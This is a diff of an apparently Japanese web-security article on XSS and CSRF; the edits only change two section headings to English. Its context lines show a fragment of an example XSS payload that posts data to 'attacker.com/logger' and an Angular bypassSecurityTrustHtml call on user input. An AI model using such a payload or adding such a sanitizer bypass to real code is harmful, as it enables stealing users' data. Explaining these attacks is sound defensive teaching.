@@ -13,7 +13,7 @@ free: false
 - 本記事の内容を悪用した場合、筆者は一切の責任を負いません
   :::
 
-## 1. XSS（クロスサイトスクリプティング）
+## 1. XSS（Cross-Site Scripting）
 
 ### 1.1 XSSとは
 
@@ -112,7 +112,7 @@ fetch('https://attacker.com/logger', {
 this.sanitizer.bypassSecurityTrustHtml(userInput)
 ```
 
-## 2. CSRF（クロスサイトリクエストフォージェリ）
+## 2. CSRF（Cross-Site Request Forgery）
 
 ### 2.1 CSRFとは
 
